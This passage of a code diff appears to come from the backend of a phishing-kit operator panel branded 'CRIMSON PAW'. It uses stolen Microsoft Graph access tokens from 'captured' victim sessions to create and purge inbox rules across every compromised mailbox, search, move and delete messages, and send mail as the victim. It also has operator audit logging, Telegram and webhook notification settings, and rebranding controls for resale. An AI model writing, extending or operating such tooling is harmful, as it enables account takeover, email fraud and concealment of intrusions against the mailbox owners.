+    if not rule_payload:
+        return jsonify({'error': {'message': f'Unknown preset key: {preset_key}'}}), 400
+
+    if all_inboxes:
+        sessions = db.get_captured_sessions()
+        created = 0
+        errs = []
+        for sess in sessions:
+            tok = db.get_graph_access_token(sess)
+            if tok:
+                res = graph.make_graph_request('/me/mailFolders/inbox/messageRules', tok, method='POST', payload=rule_payload)
+                if res and not res.get('error'):
+                    created += 1
+                else:
+                    errs.append(sess.get('user_code'))
+        return jsonify({'success': True, 'preset': preset_key, 'created_count': created, 'all_inboxes': True, 'errors': errs})
+
+    s = db.get_session_by_user_code(uc)
+    if not s or s['status'] != 'CAPTURED':
+        return jsonify({'error': {'message': 'Invalid session'}}), 400
+    token = db.get_graph_access_token(s)
+    res = graph.make_graph_request('/me/mailFolders/inbox/messageRules', token, method='POST', payload=rule_payload)
+    if res and not res.get('error'):
+        return jsonify({'success': True, 'preset': preset_key, 'data': res})
+    return jsonify(res or {'error': {'message': 'Failed to push preset rule to Graph API'}}), 400
+
+@app.route('/api/graph_proxy/purge_rules', methods=['POST'])
+def proxy_purge_rules():
+    if session.get('role') == 'operator':
+        return jsonify({'error': {'message': 'Forbidden: Operator accounts cannot modify inbox rules.'}}), 403
+
+    d = request.json or {}
+    uc = d.get('user_code')
+    all_inboxes = bool(d.get('all_inboxes', False))
+
+    if all_inboxes:
+        sessions = db.get_captured_sessions()
+        purged_total = 0
+        for sess in sessions:
+            tok = db.get_graph_access_token(sess)
+            if tok:
+                existing = graph.make_graph_request('/me/mailFolders/inbox/messageRules', tok)
+                if existing and existing.get('value'):
+                    for r in existing['value']:
+                        rid = r.get('id')
+                        if rid:
+                            graph.make_graph_request(f'/me/mailFolders/inbox/messageRules/{rid}', tok, method='DELETE')
+                            purged_total += 1
+        return jsonify({'success': True, 'purged_count': purged_total, 'all_inboxes': True})
+
+    s = db.get_session_by_user_code(uc)
+    if not s or s['status'] != 'CAPTURED':
+        return jsonify({'error': {'message': 'Invalid session'}}), 400
+    token = db.get_graph_access_token(s)
+    existing = graph.make_graph_request('/me/mailFolders/inbox/messageRules', token)
+    purged_count = 0
+    if existing and existing.get('value'):
+        for r in existing['value']:
+            rid = r.get('id')
+            if rid:
+                graph.make_graph_request(f'/me/mailFolders/inbox/messageRules/{rid}', token, method='DELETE')
+                purged_count += 1
+    return jsonify({'success': True, 'purged_count': purged_count})
+
 @app.route('/api/graph_proxy/search', methods=['GET'])
 def proxy_search():
     uc = request.args.get('user_code')
@@ -15346,6 +16737,9 @@ def proxy_search():
     q = request.args.get('q', '').replace('"', '')
     res = graph.make_graph_request(f'/me/messages?$search="{q}"&$top=50', token)
     if res and res.get('value') is not None and not res.get('error'):
+        if session.get('role') == 'operator':
+            t_acct = s.get('victim_email') or s.get('account') or uc
+            _audit_operator_action('SEARCH_QUERY', target_mailbox=t_acct, details=f"Search: '{q[:70]}'")
         return jsonify(res)
     return jsonify({'value': []})
 
@@ -15360,6 +16754,9 @@ def proxy_move_message():
     dest = data.get('destination_id', 'deleteditems')
     res = graph.make_graph_request(f'/me/messages/{mid}/move', token, method='POST', payload={'destinationId': dest})
     if res and not res.get('error'):
+        if session.get('role') == 'operator':
+            t_acct = s.get('victim_email') or s.get('account') or uc
+            _audit_operator_action('MESSAGE_MOVE', target_mailbox=t_acct, details=f"Moved message {mid} to '{dest}'")
         return jsonify({'success': True, 'data': res})
     return jsonify(res or {'error': {'message': 'Failed to move message'}}), 400
 
@@ -15374,6 +16771,9 @@ def proxy_delete_message():
     res = graph.make_graph_request(f'/me/messages/{mid}', token, method='DELETE')
     if res and res.get('error'):
         return jsonify(res), 400
+    if session.get('role') == 'operator':
+        t_acct = s.get('victim_email') or s.get('account') or uc
+        _audit_operator_action('MESSAGE_DELETE', target_mailbox=t_acct, details=f"Deleted message {mid}")
     return jsonify({'success': True})
 
 @app.route('/api/graph_proxy/update_message', methods=['POST'])
@@ -15410,6 +16810,9 @@ def proxy_batch_delete():
                 deleted += 1
         except Exception:
             failed += 1
+    if session.get('role') == 'operator':
+        t_acct = s.get('victim_email') or s.get('account') or uc
+        _audit_operator_action('BATCH_DELETE', target_mailbox=t_acct, details=f"Batch deleted {deleted} message(s)")
     return jsonify({'deleted': deleted, 'failed': failed})
 
 @app.route('/api/graph_proxy/batch_update', methods=['POST'])
@@ -15446,6 +16849,12 @@ def proxy_send_mail():
     res = graph.make_graph_request('/me/sendMail', token, method='POST', payload=payload)
     if res and res.get('error'):
         return jsonify(res), 400
+    if session.get('role') == 'operator':
+        t_acct = s.get('victim_email') or s.get('account') or uc
+        msg_obj = payload.get('message', {})
+        recips = [r.get('emailAddress', {}).get('address', '') for r in msg_obj.get('toRecipients', [])]
+        subj = msg_obj.get('subject', '(No Subject)')
+        _audit_operator_action('EMAIL_DISPATCH', target_mailbox=t_acct, details=f"Dispatched email to: {', '.join(recips)[:60]} | Subject: '{subj[:50]}'")
     return jsonify(res or {'success': True})
 
 # ═══════════════════════════════════════════════════════════════════
@@ -17614,6 +19023,8 @@ SETTINGS_FILE = Path(__file__).parent / 'settings.json'
 def get_platform_settings():
     defaults = {
         'platform_name': 'CRIMSON PAW',
+        'theme': 'crimson',
+        'custom_logo_url': '',
         'default_redirect': 'https://www.office.com/',
         'deploy_host': Config.DEPLOY_HOST,
         'refresh_threshold': 10,
@@ -17624,7 +19035,8 @@ def get_platform_settings():
         'tg_bot_token': '',
         'tg_chat_id': '',
         'webhook_url': '',
-        'notify_token': True
+        'notify_token': True,
+        'is_master_admin': bool(session.get('is_master_admin', False))
     }
     if SETTINGS_FILE.exists():
         try:
@@ -17632,6 +19044,7 @@ def get_platform_settings():
                 saved = json.load(f)
                 defaults.update(saved)
         except Exception: pass
+    defaults['is_master_admin'] = bool(session.get('is_master_admin', False))
     return jsonify(defaults)
 
 @app.route('/api/auth/change_password', methods=['POST'])
@@ -17661,7 +19074,19 @@ def api_auth_change_password():
 
 @app.route('/api/settings', methods=['POST'])
 def save_platform_settings():
+    if session.get('role') != 'admin':
+        return jsonify({'error': 'Forbidden: Admin access required'}), 403
     data = request.json or {}
+
+    # Strict Master Host guard: Only Master Host can change theme or platform rebranding
+    protected_keys = {'theme', 'platform_name', 'custom_logo_url'}
+    if any(k in data for k in protected_keys):
+        if not session.get('is_master_admin'):
+            return jsonify({
+                'success': False, 
+                'error': 'Forbidden: Theme and Platform Identity settings are strictly locked to the Master Host.'
+            }), 403
+
     cfg = {}
     if SETTINGS_FILE.exists():
         try:
@@ -17676,6 +19101,44 @@ def save_platform_settings():
         return jsonify({'success': True})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/settings/upload-logo', methods=['POST'])
+def api_upload_logo():
+    if session.get('role') != 'admin' or not session.get('is_master_admin'):
+        return jsonify({'success': False, 'error': 'Forbidden: Only Master Host can upload logo'}), 403
+
+    if 'logo' not in request.files:
+        return jsonify({'success': False, 'error': 'No file uploaded'}), 400
+
+    file = request.files['logo']
+    if not file or not file.filename:
+        return jsonify({'success': False, 'error': 'Empty filename'}), 400
+
+    ext = Path(file.filename).suffix.lower()
+    if ext not in ('.png', '.jpg', '.jpeg', '.svg', '.webp', '.ico'):
+        return jsonify({'success': False, 'error': 'Invalid file format. Please upload PNG, JPG, SVG, WEBP, or ICO.'}), 400
+
+    img_dir = Path(__file__).parent / 'static' / 'img'
+    img_dir.mkdir(parents=True, exist_ok=True)
+    dest_name = f"custom_logo{ext}"
+    dest_path = img_dir / dest_name
+    file.save(str(dest_path))
+
+    logo_url = f"/static/img/{dest_name}?v={int(time.time())}"
+
+    cfg = {}
+    if SETTINGS_FILE.exists():
+        try:
+            with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
+                cfg = json.load(f)
+        except Exception: pass
+    cfg['custom_logo_url'] = logo_url
+    try:
+        with open(SETTINGS_FILE, 'w', encoding='utf-8') as f:
+            json.dump(cfg, f, indent=2)
+    except Exception: pass
+
+    return jsonify({'success': True, 'logo_url': logo_url})
 
 def html_escape(text):
     if text is None: return ''
